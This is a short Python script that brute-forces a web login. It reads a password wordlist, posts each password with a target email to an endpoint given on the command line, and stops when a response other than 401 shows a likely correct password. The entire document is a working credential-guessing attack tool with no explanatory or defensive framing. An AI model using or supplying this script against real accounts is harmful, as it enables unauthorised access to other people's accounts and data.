import requests
import sys

with open("best1050.txt", "r") as file:
	passwds = file.readlines()

def brute(endpoint, email):
	for passwd in passwds:
		passwd = passwd.strip()
		body={"email":email, "password": passwd}
		res = requests.post(endpoint, json=body)
		code = res.status_code
		print("{} - {}".format(passwd, code))
		if code != 401:
			print("{}".format(passwd))
			break


if __name__ == "__main__":
	endpoint = sys.argv[1]
	email = sys.argv[2]
	brute(endpoint, email)
